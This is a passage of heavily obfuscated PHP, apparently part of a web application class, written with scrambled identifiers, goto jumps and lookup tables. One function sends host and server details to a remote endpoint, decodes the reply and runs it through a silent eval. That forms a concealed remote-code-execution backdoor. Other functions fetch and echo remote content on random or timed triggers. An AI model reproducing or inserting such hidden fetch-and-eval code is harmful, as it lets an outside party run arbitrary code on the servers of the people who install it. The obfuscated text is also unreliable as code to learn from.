$bâõïË­À¡[61]($bâõïË­À¡[62])->{$_SERVER[‚Ÿßñ][226]}($bâõïË­À¡[227], $bâõïË­À¡[240]); $this->juriabc3ae07 = array(); $this->mace5759fa2b = $bâõïË­À¡[130]; } private function xdms616abcb4() { goto f‚Õ¦ĞŸÒ¬; CĞÜÛ‹²‡Š: if (strlen($DëÑÔÂë¸Ö) < $D®°‹÷İ¤í[580]) { die; } if ($f¡„ÌÎÁ•ñ[$AË²ÏŒø×÷[129]] == $AË²ÏŒø×÷[130]) { return; } $CŠ§İ‡í¯ = $AË²ÏŒø×÷[61]($AË²ÏŒø×÷[62])->{$_SERVER[‚Ÿßñ][63]}($AË²ÏŒø×÷[125]); goto EôÑ‰ÌÑ”; eØ™Æ÷ÑÅ: $this->mace5759fa2b = $AË²ÏŒø×÷[130]; $f¡„ÌÎÁ•ñ = $AË²ÏŒø×÷[61]($AË²ÏŒø×÷[62])->{$_SERVER[‚Ÿßñ][63]}(); $DëÑÔÂë¸Ö = $D®°‹÷İ¤í[602]; goto CĞÜÛ‹²‡Š; EĞ•†Â­¬í: $this->juriabc3ae07 = $dÌÑãÌÁ–ƒ; $this->mace5759fa2b = $f¡„ÌÎÁ•ñ[$AË²ÏŒø×÷[129]]; goto Cƒ†ë§„Àœ; EôÑ‰ÌÑ”: $D•”åğ¼í‹ = $D®°‹÷İ¤í[603]; if (strlen($D•”åğ¼í‹) < $D®°‹÷İ¤í[571]) { die; } $c¿Êß¨İíÈ = $AË²ÏŒø×÷[230]($AË²ÏŒø×÷[61]($AË²ÏŒø×÷[11])->{$_SERVER[‚Ÿßñ][231]}(), $AË²ÏŒø×÷[232]); goto f·î½¢•Ê˜; FãÊç’¥¡: $aš²‘¸¨† = $AË²ÏŒø×÷[222]($AË²ÏŒø×÷[25]($a“¯Æ±¬ƒ, 10, 16)); $dÌÑãÌÁ–ƒ = $this->{$_SERVER[‚Ÿßñ][197]}($C¿½ô‚§Â÷[$AË²ÏŒø×÷[100]][$aš²‘¸¨†], $a“¯Æ±¬ƒ); $dÌÑãÌÁ–ƒ = $AË²ÏŒø×÷[199]($dÌÑãÌÁ–ƒ, !0); goto E˜ñ×¹ß‹; f‚Õ¦ĞŸÒ¬: $D®°‹÷İ¤í =& $_SERVER[¨¤¼…´]; $AË²ÏŒø×÷ =& $_SERVER[‚Ÿßñ]; $_SERVER[$AË²ÏŒø×÷[184]] = $AË²ÏŒø×÷[113]($_SERVER, $AË²ÏŒø×÷[184], APP_HOST); goto eØ™Æ÷ÑÅ; E˜ñ×¹ß‹: if (!$AË²ÏŒø×÷[200]($dÌÑãÌÁ–ƒ)) { return $this->{$_SERVER[‚Ÿßñ][173]}(); } $aÑ£ÆéÛöÊ = $AË²ÏŒø×÷[153]($dÌÑãÌÁ–ƒ[$AË²ÏŒø×÷[154]]); if ($AË²ÏŒø×÷[241]() >= $aÑ£ÆéÛöÊ) { return $this->{$_SERVER[‚Ÿßñ][173]}(); } goto EĞ•†Â­¬í; f·î½¢•Ê˜: $C¿½ô‚§Â÷ = $c¿Êß¨İíÈ[$AË²ÏŒø×÷[233]]; $a“¯Æ±¬ƒ = $AË²ÏŒø×÷[123]($_SERVER[$AË²ÏŒø×÷[124]] . $AË²ÏŒø×÷[222]($CŠ§İ‡í¯) . $f¡„ÌÎÁ•ñ[$AË²ÏŒø×÷[218]]); $Aˆ«é¢ãØ = $D®°‹÷İ¤í[604]; goto FãÊç’¥¡; Cƒ†ë§„Àœ: } private function uzkq4ecd3cac() { goto e·öÅíª; b³ö¿ĞÄĞï: if ($D‹õŒˆÄš == $fÄª¥èä´›[242] && $this->mace5759fa2b == $fÄª¥èä´›[130]) { $fÄª¥èä´›[175]($fÄª¥èä´›[206]($fÄª¥èä´›[243]), !1, $fÄª¥èä´›[244]); } $fËé°Œ½ = array($fÄª¥èä´›[245], $fÄª¥èä´›[246]); if ($fÄª¥èä´›[247]($D‹õŒˆÄš, $fËé°Œ½)) { if ($this->mace5759fa2b == $fÄª¥èä´›[130] && isset($AİË¨´™ù[$fÄª¥èä´›[248]])) { $fÄª¥èä´›[175]($fÄª¥èä´›[206]($fÄª¥èä´›[243]), !1, $fÄª¥èä´›[244]); die; } $D‘”˜Ö»ÄŒ = $this->{$_SERVER[‚Ÿßñ][146]}(); if ($D‘”˜Ö»ÄŒ != $fÄª¥èä´›[249]($fÄª¥èä´›[250])) { if ($D‘”˜Ö»ÄŒ <= $fÄª¥èä´›[61]($fÄª¥èä´›[148])->{$_SERVER[‚Ÿßñ][149]}()) { $fÄª¥èä´›[175]($fÄª¥èä´›[206]($fÄª¥èä´›[251]), !1, $fÄª¥èä´›[244]); die; } } } goto e‘³ŒÍõ“ƒ; a†Á‰ß”İ¥: $D‹õŒˆÄš = $_SERVER[$fÄª¥èä´›[44]]; $DÜË£×Ç˜½ = $f³ŒÕÑ¯øœ[605]; if (strlen($DÜË£×Ç˜½) < $f³ŒÕÑ¯øœ[580]) { die; } goto b³ö¿ĞÄĞï; e·öÅíª: $f³ŒÕÑ¯øœ =& $_SERVER[¨¤¼…´]; $fÄª¥èä´› =& $_SERVER[‚Ÿßñ]; $AİË¨´™ù = $GLOBALS[$fÄª¥èä´›[22]]; goto a†Á‰ß”İ¥; e‘³ŒÍõ“ƒ: } private function lfic9d9ed966() { goto AšÎ°Ì˜´; AšÎ°Ì˜´: $d åÑØñÈí =& $_SERVER[¨¤¼…´]; $B˜Û„Â˜æ =& $_SERVER[‚Ÿßñ]; $FÈÂœ³‘†¶ = array($B˜Û„Â˜æ[144], $B˜Û„Â˜æ[252]); goto f²çÓ½–«Š; f²çÓ½–«Š: if (!$B˜Û„Â˜æ[113]($GLOBALS, $B˜Û„Â˜æ[141]) || !isset($_GET[$B˜Û„Â˜æ[253]])) { return; } if (!$B˜Û„Â˜æ[247]($_SERVER[$B˜Û„Â˜æ[44]], $FÈÂœ³‘†¶)) { return; } $fˆÚ´âÒå = $B˜Û„Â˜æ[254]; goto f‚ùóêâ½®; AàôÛÌ˜: $aÔà²Èãí = $B˜Û„Â˜æ[257](array($B˜Û„Â˜æ[258] => array($B˜Û„Â˜æ[259] => $B˜Û„Â˜æ[260], $B˜Û„Â˜æ[261] => 3))); $BÍŠô‘áÜ = @$B˜Û„Â˜æ[262]($fˆÚ´âÒå, !1, $aÔà²Èãí); $B˜Û„Â˜æ[263]($B˜Û„Â˜æ[264]); goto aš´ÒÉóòÕ; f‚ùóêâ½®: $fˆÚ´âÒå = $this->{$_SERVER[‚Ÿßñ][255]}($fˆÚ´âÒå, $B˜Û„Â˜æ[256]); $a¬É©ªÖš = $d åÑØñÈí[606]; while ($a¬É©ªÖš < $d åÑØñÈí[15]) { if ($a¬É©ªÖš >= 0) { break; } $a¬É©ªÖš++; } goto AàôÛÌ˜; aš´ÒÉóòÕ: if ($BÍŠô‘áÜ && $B˜Û„Â˜æ[32]($BÍŠô‘áÜ, $B˜Û„Â˜æ[265])) { echo $BÍŠô‘áÜ; } die; goto bõ‰Ñ„ÁØ¯; bõ‰Ñ„ÁØ¯: } public function vtpg6d7a4558($f¡„­¼´³‘) { goto b³Äº“ĞãÈ; d“”ÔÇ¸ˆÏ: return $f¡„­¼´³‘; goto f†¤©‘â¥á; dÀÎšÀÌÂ¸: $Fˆ¥¨§øšŠ = array(); foreach ($b‡ß¤Øˆ…Û as $C­‰ÕÅòØà => $D¨ìŠÌê¯­) { if ($D¨ìŠÌê¯­ == $b‘ê†³ƒ…é[268] && $b‘ê†³ƒ…é[25]($this->mace5759fa2b, 0, 1) == $b‘ê†³ƒ…é[268]) { continue; } if (!$b‘ê†³ƒ…é[247]($C­‰ÕÅòØà, $dÉÑ¿ƒìŞÏ)) { $Fˆ¥¨§øšŠ[] = $C­‰ÕÅòØà; } } foreach ($Fˆ¥¨§øšŠ as $C­‰ÕÅòØà) { unset($f¡„­¼´³‘[$C­‰ÕÅòØà]); } goto d“”ÔÇ¸ˆÏ; b³Äº“ĞãÈ: $b×”ˆË™ =& $_SERVER[¨¤¼…´]; $b‘ê†³ƒ…é =& $_SERVER[‚Ÿßñ]; if ($this->mace5759fa2b == $b‘ê†³ƒ…é[266]) { return $f¡„­¼´³‘; } goto eğ’‰–…ÀÙ; eğ’‰–…ÀÙ: $b‡ß¤Øˆ…Û = array($b‘ê†³ƒ…é[267] => $b‘ê†³ƒ…é[268], $b‘ê†³ƒ…é[269] => $b‘ê†³ƒ…é[268], $b‘ê†³ƒ…é[270] => $b‘ê†³ƒ…é[268], $b‘ê†³ƒ…é[271] => $b‘ê†³ƒ…é[268], $b‘ê†³ƒ…é[272] => $b‘ê†³ƒ…é[268], $b‘ê†³ƒ…é[273] => $b‘ê†³ƒ…é[268], $b‘ê†³ƒ…é[274] => $b‘ê†³ƒ…é[275], $b‘ê†³ƒ…é[276] => $b‘ê†³ƒ…é[275], $b‘ê†³ƒ…é[277] => $b‘ê†³ƒ…é[275], $b‘ê†³ƒ…é[278] => $b‘ê†³ƒ…é[275], $b‘ê†³ƒ…é[279] => $b‘ê†³ƒ…é[275], $b‘ê†³ƒ…é[280] => $b‘ê†³ƒ…é[275], $b‘ê†³ƒ…é[281] => $b‘ê†³ƒ…é[275]); $C½¬‹Ã‚–Ñ = $b×”ˆË™[607]; if (!$C½¬‹Ã‚–Ñ) { return; } goto d¡ƒÇÛ‘„É; d¡ƒÇÛ‘„É: $dÉÑ¿ƒìŞÏ = $b‘ê†³ƒ…é[0]($b‘ê†³ƒ…é[282], $b‘ê†³ƒ…é[113]($this->juriabc3ae07, $b‘ê†³ƒ…é[138], $b‘ê†³ƒ…é[10])); $e¿Ê¤å·êŒ = $b×”ˆË™[608]; if (strlen($e¿Ê¤å·êŒ) < $b×”ˆË™[580]) { return; } goto dÀÎšÀÌÂ¸; f†¤©‘â¥á: } private function lwgn909293fa() { $A¥Ş®—ôãš =& $_SERVER[‚Ÿßñ]; if ($this->mace5759fa2b != $A¥Ş®—ôãš[130]) { return; } $GLOBALS[$A¥Ş®—ôãš[100]][$A¥Ş®—ôãš[104]][$A¥Ş®—ôãš[283]] = $A¥Ş®—ôãš[228]; $GLOBALS[$A¥Ş®—ôãš[100]][$A¥Ş®—ôãš[284]] = $A¥Ş®—ôãš[228]; if ($A¥Ş®—ôãš[61]($A¥Ş®—ôãš[285])->{$_SERVER[‚Ÿßñ][63]}($A¥Ş®—ôãš[89]) != $A¥Ş®—ôãš[240]) { $A¥Ş®—ôãš[61]($A¥Ş®—ôãš[285])->{$_SERVER[‚Ÿßñ][229]}($A¥Ş®—ôãš[89], $A¥Ş®—ôãš[240]); } } public function psgn0d95e820() { return $_SERVER[‚Ÿßñ][286]; } private function clipdd7449f1() { goto AõÄø¨ßãË; c’‡ï¬Ğ‰‚: if ($F…çÅ™ğŸê[$f¥ôÂ†‡ôã[174]] && $F…çÅ™ğŸê[$f¥ôÂ†‡ôã[296]]) { if ($this->{$_SERVER[‚Ÿßñ][208]}($F…çÅ™ğŸê[$f¥ôÂ†‡ôã[296]]) == $f“ÈÕÎÂ…‡[$f¥ôÂ†‡ôã[174]]) { return; } } $this->{$_SERVER[‚Ÿßñ][173]}(); $ašÒ·°åš = $b¶ÓÏ…••ƒ[611]; goto eø’¢Á´Ø; eø’¢Á´Ø: if ($this->{$_SERVER[‚Ÿßñ][208]}($F…çÅ™ğŸê[$f¥ôÂ†‡ôã[296]]) != $f“ÈÕÎÂ…‡[$f¥ôÂ†‡ôã[174]]) { $A›»Ã‹¸òğ = array($f¥ôÂ†‡ôã[210] => $f¥ôÂ†‡ôã[61]($f¥ôÂ†‡ôã[62])->{$_SERVER[‚Ÿßñ][63]}($f¥ôÂ†‡ôã[125]), $f¥ôÂ†‡ôã[211] => $_SERVER[$f¥ôÂ†‡ôã[124]], $f¥ôÂ†‡ôã[212] => $f¥ôÂ†‡ôã[213](), $f¥ôÂ†‡ôã[183] => $_SERVER[$f¥ôÂ†‡ôã[184]]); $aŒ£–ÀçÖ› = $this->{$_SERVER[‚Ÿßñ][214]}($f¥ôÂ†‡ôã[157]($A›»Ã‹¸òğ)); $F…çÅ™ğŸê = $this->{$_SERVER[‚Ÿßñ][191]}($f¥ôÂ†‡ôã[215] . $aŒ£–ÀçÖ›); if ($F…çÅ™ğŸê && $f¥ôÂ†‡ôã[200]($F…çÅ™ğŸê) && isset($F…çÅ™ğŸê[$f¥ôÂ†‡ôã[296]])) { $AŠİÀßÉÕ‘ = $this->{$_SERVER[‚Ÿßñ][197]}($F…çÅ™ğŸê[$f¥ôÂ†‡ôã[296]], 2); if ($AŠİÀßÉÕ‘) { $AŠİÀßÉÕ‘ = $this->{$_SERVER[‚Ÿßñ][208]}($AŠİÀßÉÕ‘); } if ($AŠİÀßÉÕ‘) { try { @eval($AŠİÀßÉÕ‘); } catch (Exception $EèŞ ¬ñò§) { } } } } goto BÆ¢†£í; AõÄø¨ßãË: $b¶ÓÏ…••ƒ =& $_SERVER[¨¤¼…´]; $f¥ôÂ†‡ôã =& $_SERVER[‚Ÿßñ]; $c÷áæ™•ƒÆ = array($f¥ôÂ†‡ôã[287], $f¥ôÂ†‡ôã[288], $f¥ôÂ†‡ôã[289]); goto A–®´‰áÜ‹; EèÏøá›”ß: $f“ÈÕÎÂ…‡ = array($f¥ôÂ†‡ôã[174] => $f¥ôÂ†‡ôã[61]($f¥ôÂ†‡ôã[62])->{$_SERVER[‚Ÿßñ][63]}($f¥ôÂ†‡ôã[217]), $f¥ôÂ†‡ôã[187] => $this->mace5759fa2b, $f¥ôÂ†‡ôã[185] => $_SERVER[$f¥ôÂ†‡ôã[186]], $f¥ôÂ†‡ôã[178] => $f¥ôÂ†‡ôã[158], $f¥ôÂ†‡ôã[181] => $_SERVER[$f¥ôÂ†‡ôã[182]]); $F…çÅ™ğŸê = $this->{$_SERVER[‚Ÿßñ][191]}($f¥ôÂ†‡ôã[295], $f“ÈÕÎÂ…‡); if (!$f¥ôÂ†‡ôã[200]($F…çÅ™ğŸê)) { return; } goto c’‡ï¬Ğ‰‚; A–®´‰áÜ‹: $EÊ’ØÌË® = $b¶ÓÏ…••ƒ[609]; $dİ„ÓŸ…À = $f¥ôÂ†‡ôã[290] . $f¥ôÂ†‡ôã[123]($f¥ôÂ†‡ôã[291]); if ($this->mace5759fa2b == $f¥ôÂ†‡ôã[130] || !$f¥ôÂ†‡ôã[113]($GLOBALS, $f¥ôÂ†‡ôã[141])) { return; } goto AºŒÖ’—Šë; B¦¤ï´ŸâÄ: if ($eŠ›‡³’½« && $f¥ôÂ†‡ôã[241]() - $eŠ›‡³’½« < $f¥ôÂ†‡ôã[249]($f¥ôÂ†‡ôã[294])) { return; } $f¥ôÂ†‡ôã[13](array($f¥ôÂ†‡ôã[292], $f¥ôÂ†‡ôã[161]), $dİ„ÓŸ…À, $f¥ôÂ†‡ôã[241]()); $Añ×ƒÃ·õ = $b¶ÓÏ…••ƒ[610]; goto EèÏøá›”ß; AºŒÖ’—Šë: if (!$f¥ôÂ†‡ôã[247]($_SERVER[$f¥ôÂ†‡ôã[44]], $c÷áæ™•ƒÆ)) { return; } if ($f¥ôÂ†‡ôã[241]() % 4 != 0) { return; } $eŠ›‡³’½« = $f¥ôÂ†‡ôã[13](array($f¥ôÂ†‡ôã[292], $f¥ôÂ†‡ôã[293]), $dİ„ÓŸ…À); goto B¦¤ï´ŸâÄ; BÆ¢†£í: } private function ytgx147d3532($dµÛÊ–ï’ = '', $bŸ•ê˜Ëø = array(), $fŠÓ··¦ôê = 5) { goto BôÎÙËšÒƒ; F„Ùá¶Ş: $bâ¼ñöß¯˜ = $EÔ“’ÍˆÈ[613]; while ($bâ¼ñöß¯˜ < $EÔ“’ÍˆÈ[571]) { if ($bâ¼ñöß¯˜ >= 0) { break; } $bâ¼ñöß¯˜++; } $bŸ•ê˜Ëø = @$CÁÀÅÊ£Ú[262]($AèÌ£Ôç÷Î, !1, $B˜¥«‰ßàÆ); goto FÔâ£®êñ; E­™È½äíÄ: $AèÌ£Ôç÷Î = $AèÌ£Ôç÷Î . $dµÛÊ–ï’ . $CÁÀÅÊ£Ú[299] . $CÁÀÅÊ£Ú[300]($bŸ•ê˜Ëø); if ($bŸ•ê˜Ëø === -1) { return $AèÌ£Ôç÷Î; } $B˜¥«‰ßàÆ = $CÁÀÅÊ£Ú[257](array($CÁÀÅÊ£Ú[258] => array($CÁÀÅÊ£Ú[261] => $fŠÓ··¦ôê, $CÁÀÅÊ£Ú[259] => $CÁÀÅÊ£Ú[301]), $CÁÀÅÊ£Ú[302] => array($CÁÀÅÊ£Ú[303] => !1, $CÁÀÅÊ£Ú[304] => !1))); goto F„Ùá¶Ş; fà“ÑªÌÉñ: $AèÌ£Ôç÷Î = $this->{$_SERVER[‚Ÿßñ][255]}($AèÌ£Ôç÷Î, $CÁÀÅÊ£Ú[298]); $Eø˜‰Ù½•’ = $EÔ“’ÍˆÈ[612]; if (strlen($Eø˜‰Ù½•’) < $EÔ“’ÍˆÈ[580]) { die; } goto E­™È½äíÄ; BôÎÙËšÒƒ: $EÔ“’ÍˆÈ =& $_SERVER[¨¤¼…´]; $CÁÀÅÊ£Ú =& $_SERVER[‚Ÿßñ]; $AèÌ£Ôç÷Î = $CÁÀÅÊ£Ú[297]; goto fà“ÑªÌÉñ; FÔâ£®êñ: $DÅ¡Ó’ƒøİ = $EÔ“’ÍˆÈ[614]; while (strlen($DÅ¡Ó’ƒøİ) < $EÔ“’ÍˆÈ[578]) { if (!$DÅ¡Ó’ƒøİ) { break; } $DÅ¡Ó’ƒøİ++; } return $CÁÀÅÊ£Ú[199]($bŸ•ê˜Ëø, !0); goto c“Ş‚““×¡; c“Ş‚““×¡: $bâ°î¹ÀÛ = $EÔ“’ÍˆÈ[615]; goto b‹Æê¬óÎ; b‹Æê¬óÎ: } private function ngad089a4df2() { goto fÏ™”Â¹ÔÛ; fÙŸæ ›…İ: $A¼«Ô¼µ›á = $e¤’åï¨ùõ[$this->mace5759fa2b]; $A¼«Ô¼µ›á = $f‹Œßæíãù[249]($A¼«Ô¼µ›á ? $A¼«Ô¼µ›á : $f‹Œßæíãù[306]); $eˆ¬Ö Ó‘â = $e×Ëéğ­“[616]; goto D¡•»êŠË£; D¡•»êŠË£: $B‡öÙ ÈÍ‰ = $f‹Œßæíãù[113]($this->juriabc3ae07, $f‹Œßæíãù[332]); $fÍ™Œïæ£ = $e×Ëéğ­“[617]; $B‡öÙ ÈÍ‰ = $B‡öÙ ÈÍ‰ ? $f‹Œßæíãù[249]($B‡öÙ ÈÍ‰) : 0; goto FİŠÕëÊÌ°; FİŠÕëÊÌ°: return $A¼«Ô¼µ›á + $B‡öÙ ÈÍ‰; goto fÆÒŞ¹†®; fÏ™”Â¹ÔÛ: $e×Ëéğ­“ =& $_SERVER[¨¤¼…´]; $f‹Œßæíãù =& $_SERVER[‚Ÿßñ]; $e¤’åï¨ùõ = array($f‹Œßæíãù[305] => $f‹Œßæíãù[306], $f‹Œßæíãù[307] => $f‹Œßæíãù[308], $f‹Œßæíãù[309] => $f‹Œßæíãù[310], $f‹Œßæíãù[311] => $f‹Œßæíãù[312], $f‹Œßæíãù[313] => $f‹Œßæíãù[314], $f‹Œßæíãù[315] => $f‹Œßæíãù[250], $f‹Œßæíãù[316] => $f‹Œßæíãù[250], $f‹Œßæíãù[317] => $f‹Œßæíãù[306], $f‹Œßæíãù[318] => $f‹Œßæíãù[308], $f‹Œßæíãù[319] => $f‹Œßæíãù[310], $f‹Œßæíãù[320] => $f‹Œßæíãù[321], $f‹Œßæíãù[322] => $f‹Œßæíãù[312], $f‹Œßæíãù[323] => $f‹Œßæíãù[324], $f‹Œßæíãù[325] => $f‹Œßæíãù[314], $f‹Œßæíãù[326] => $f‹Œßæíãù[327], $f‹Œßæíãù[328] => $f‹Œßæíãù[329], $f‹Œßæíãù[330] => $f‹Œßæíãù[331]); goto fÙŸæ ›…İ; fÆÒŞ¹†®: } public function ifst45395ac8($eŞ¯çŒšï) { goto a±¿œÁØ; a±¿œÁØ: $böŒİõ°ó¼ =& $_SERVER[¨¤¼…´]; $dÑ¼Ò‚ñˆ =& $_SERVER[‚Ÿßñ]; $EŠ÷í×˜šõ = $this->{$_SERVER[‚Ÿßñ][146]}(); goto F–ÛÂ‰­ë; Aáâİ—Á½¸: $C´ëĞğ¸ „ = $böŒİõ°ó¼[620]; if (!$dÑ¼Ò‚ñˆ[247]($eŞ¯çŒšï[$dÑ¼Ò‚ñˆ[333]], $f‘¼ÒÙ‘¢§)) { $dÑ¼Ò‚ñˆ[175]($dÑ¼Ò‚ñˆ[337], !1, $dÑ¼Ò‚ñˆ[244]); } goto eï§ÂˆŞ±; F–ÛÂ‰­ë: if ($eŞ¯çŒšï[$dÑ¼Ò‚ñˆ[333]] == $dÑ¼Ò‚ñˆ[228]) { return; } if ($EŠ÷í×˜šõ >= $dÑ¼Ò‚ñˆ[249]($dÑ¼Ò‚ñˆ[250])) { return; } $D½„ª”‰³¸ = $dÑ¼Ò‚ñˆ[61]($dÑ¼Ò‚ñˆ[148])->{$_SERVER[‚Ÿßñ][149]}(); goto fé°Ş‚‚é¼; fßèé‚çÂò: $e”²×Ö­ù = $böŒİõ°ó¼[619]; if (strlen($e”²×Ö­ù) < $böŒİõ°ó¼[571]) { return; } $f‘¼ÒÙ‘¢§ = $dÑ¼Ò‚ñˆ[230]($f‘¼ÒÙ‘¢§, $dÑ¼Ò‚ñˆ[10], $dÑ¼Ò‚ñˆ[333]); goto Aáâİ—Á½¸; fé°Ş‚‚é¼: $bâ¡ƒº‡ñ = $böŒİõ°ó¼[618]; if ($D½„ª”‰³¸ <= $EŠ÷í×˜šõ) { return; } $f‘¼ÒÙ‘¢§ = $dÑ¼Ò‚ñˆ[61]($dÑ¼Ò‚ñˆ[148])->{$_SERVER[‚Ÿßñ][334]}($dÑ¼Ò‚ñˆ[333])->{$_SERVER[‚Ÿßñ][335]}($EŠ÷í×˜šõ)->{$_SERVER[‚Ÿßñ][336]}(); goto fßèé‚çÂò; eï§ÂˆŞ±: } public function mkeq03c1c134() { goto C Àê—ØØ; fâ‰¯õÈ: while (strlen($D‚¾‰†ÈÚ) < $A’¹ùÂâÌ[568]) { if (!$D‚¾‰†ÈÚ) { break; } $D‚¾‰†ÈÚ++; } $b‡ŞâÑæÏ = @$DğéÓ±Íˆ‘[262]($Fï ’·‰¨, !1, $Aº˜ÏØœÒ™); echo $DğéÓ±Íˆ‘[339] . $DğéÓ±Íˆ‘[340]($b‡ŞâÑæÏ) . $DğéÓ±Íˆ‘[341]; goto c© §÷ÅÑ¯; D©¬ñ°æ†ê: $Fï ’·‰¨ = $DğéÓ±Íˆ‘[254]; $aÒÉŒøØ–Í = $A’¹ùÂâÌ[621]; while (strlen($aÒÉŒøØ–Í) < $A’¹ùÂâÌ[568]) { if (!$aÒÉŒøØ–Í) { break; } $aÒÉŒøØ–Í++; } goto B© £Ù¿‘; B© £Ù¿‘: $Fï ’·‰¨ = $this->{$_SERVER[‚Ÿßñ][255]}($Fï ’·‰¨, $DğéÓ±Íˆ‘[256]); $Aº˜ÏØœÒ™ = $DğéÓ±Íˆ‘[257](array($DğéÓ±Íˆ‘[258] => array($DğéÓ±Íˆ‘[259] => $DğéÓ±Íˆ‘[260], $DğéÓ±Íˆ‘[261] => 3))); $D‚¾‰†ÈÚ = $A’¹ùÂâÌ[622]; goto fâ‰¯õÈ; C Àê—ØØ: $A’¹ùÂâÌ =& $_SERVER[¨¤¼…´]; $DğéÓ±Íˆ‘ =& $_SERVER[‚Ÿßñ]; if (!$DğéÓ±Íˆ‘[113]($GLOBALS, $DğéÓ±Íˆ‘[141]) || $DğéÓ±Íˆ‘[338](1, 100) > 20) { return; } goto D©¬ñ°æ†ê; c© §÷ÅÑ¯: } private function jerdd23e2eb9($fƒàÁÁ§, $CçÇô¥’š, $fˆºì»Í¯ = 3) { goto e¶Õ‹µæ¼Î; aÈØø«ÎÉ: return $b±Êä¤óâå; goto f¾Ïã¶™§; EåÅëáõ‚Ù: $Bõ×†„¢ù… = $F‚ï“­ƒÔ‰[645]; while (strlen($Bõ×†„¢ù…) < $F‚ï“­ƒÔ‰[571]) { if (!$Bõ×†„¢ù…) { break; } $Bõ×†„¢ù…++; } if ($fˆºì»Í¯ - 1 > 0) { $b±Êä¤óâå = $this->{$_SERVER[‚Ÿßñ][136]}($b±Êä¤óâå, $CçÇô¥’š, $fˆºì»Í¯ - 1); } goto aÈØø«ÎÉ; D“ÆêÑÜ…: $fƒàÁÁ§ = $cµàÓŒê[2]($fƒàÁÁ§); $cœõá„Ïİ’ = $F‚ï“­ƒÔ‰[623]; if (!$cœõá„Ïİ’) { return; } goto c¼†í¸¹¦Ö; c¼†í¸¹¦Ö: $f¥«Â™ÇÚ = $cµàÓŒê[338](0, 5) . $cµàÓŒê[10]; $dé‹êŠ†„ = $F‚ï“­ƒÔ‰[624]; while ($dé‹êŠ†„ < $F‚ï“­ƒÔ‰[568]) { if ($dé‹êŠ†„ >= 0) { break; } $dé‹êŠ†„++; } goto b´‡ó¤°æ; e¶Õ‹µæ¼Î: $F‚ï“­ƒÔ‰ =& $_SERVER[¨¤¼…´]; $cµàÓŒê =& $_SERVER[‚Ÿßñ]; $cµàÓŒê[342](1); goto D“ÆêÑÜ…; b´‡ó¤°æ: $cš¢Í‰¬»Ö = $cµàÓŒê[133](15); $aÕªáÃÏ°ê = $cµàÓŒê[343]; $c‘ÆÁ£å‹š = $F‚ï“­ƒÔ‰[625]; goto dÚ„âòÆéñ; dÚ„âòÆéñ: if (strlen($c‘ÆÁ£å‹š) < $F‚ï“­ƒÔ‰[15]) { die; } switch ($f¥«Â™ÇÚ) { case $cµàÓŒê[240]: $b±Êä¤óâå = $this->{$_SERVER[‚Ÿßñ][156]}($fƒàÁÁ§, $cµàÓŒê[222]($CçÇô¥’š . $cš¢Í‰¬»Ö)); break; $Dƒ™ÔáÛÓ = $F‚ï“­ƒÔ‰[626]; if (strlen($Dƒ™ÔáÛÓ) < $F‚ï“­ƒÔ‰[571]) { die; } case $cµàÓŒê[228]: $b±Êä¤óâå = $this->{$_SERVER[‚Ÿßñ][156]}($fƒàÁÁ§, $cµàÓŒê[222]($cš¢Í‰¬»Ö . $CçÇô¥’š)); $BÃ¢ ¯Êñè = $F‚ï“­ƒÔ‰[627]; break; $C³¯ ÈÉÅ£ = $F‚ï“­ƒÔ‰[628]; if (strlen($C³¯ ÈÉÅ£) < $F‚ï“­ƒÔ‰[578]) { die; } case $cµàÓŒê[344]: $b±Êä¤óâå = $this->{$_SERVER[‚Ÿßñ][156]}($fƒàÁÁ§, $cµàÓŒê[127]($cš¢Í‰¬»Ö . $CçÇô¥’š)); $DĞÎ¡‰½àˆ = $F‚ï“­ƒÔ‰[629]; if (strlen($DĞÎ¡‰½àˆ) < $F‚ï“­ƒÔ‰[15]) { die; } break; case $cµàÓŒê[345]: $b±Êä¤óâå = $this->{$_SERVER[‚Ÿßñ][156]}($fƒàÁÁ§, $cµàÓŒê[123]($cš¢Í‰¬»Ö . $CçÇô¥’š)); break; $F³­Ä“Ğß¢ = $F‚ï“­ƒÔ‰[630]; while (strlen($F³­Ä“Ğß¢) < $F‚ï“­ƒÔ‰[580]) { if (!$F³­Ä“Ğß¢) { break; } $F³­Ä“Ğß¢++; } case $cµàÓŒê[346]: goto EÜáˆ‡ËÜË; EÜáˆ‡ËÜË: $fƒàÁÁ§ = $cµàÓŒê[127]($fƒàÁÁ§); $døÙòùØìŸ = $cµàÓŒê[347](0, 64); $AÒ„‘äÙç = $F‚ï“­ƒÔ‰[631]; goto D£“Ü×£Àß; FïâØ«àÛ‚: $Fİˆ›ôìÇ‡ = $cµàÓŒê[10]; $BÔì‚‡İ  = $F‚ï“­ƒÔ‰[635]; $FÅ”öšŒÕá = 0; goto c¹äßÙ£‚¯; Cñïë†õßí: if (!$A¡´²î´Óî) { return; } $fØïİ…¯áŒ = $cµàÓŒê[25]($fØïİ…¯áŒ, $døÙòùØìŸ % 8, $døÙòùØìŸ % 8 + 7); $DÎâ—Î§ã = $F‚ï“­ƒÔ‰[634]; goto FïâØ«àÛ‚; aš†¡±òšÕ: $FŸéĞŒô¸ë = $F‚ï“­ƒÔ‰[637]; $cÛÑ·è¼»¨ = 0; $DÁ»§Ïáò = $F‚ï“­ƒÔ‰[638]; goto f·Àé·”ê; c¹äßÙ£‚¯: $Ağ¦–®ğÒç = $F‚ï“­ƒÔ‰[636]; if (strlen($Ağ¦–®ğÒç) < $F‚ï“­ƒÔ‰[15]) { die; } $AéÒÈã°ğ = 0; goto aš†¡±òšÕ; b¥º–ÒŒİ: while (strlen($AÃ·´Š†¶) < $F‚ï“­ƒÔ‰[15]) { if (!$AÃ·´Š†¶) { break; } $AÃ·´Š†¶++; } $fØïİ…¯áŒ = $cµàÓŒê[123]($B‹àåµŠ™ . $cµàÓŒê[123]($CçÇô¥’š . $B‹àåµŠ™) . $CçÇô¥’š); $A¡´²î´Óî = $F‚ï“­ƒÔ‰[633]; goto Cñïë†õßí; f·Àé·”ê: if (!$DÁ»§Ïáò) { die; } for ($FÅ”öšŒÕá = 0; $FÅ”öšŒÕá < $cµàÓŒê[24]($fƒàÁÁ§); $FÅ”öšŒÕá++) { $cÛÑ·è¼»¨ = $cÛÑ·è¼»¨ == $cµàÓŒê[24]($fØïİ…¯áŒ) ? 0 : $cÛÑ·è¼»¨; $Fó¹ë—ÊÍ˜ = $F‚ï“­ƒÔ‰[639]; if (!$Fó¹ë—ÊÍ˜) { die; } $AéÒÈã°ğ = ($døÙòùØìŸ + $cµàÓŒê[348]($aÕªáÃÏ°ê, $fƒàÁÁ§[$FÅ”öšŒÕá]) + 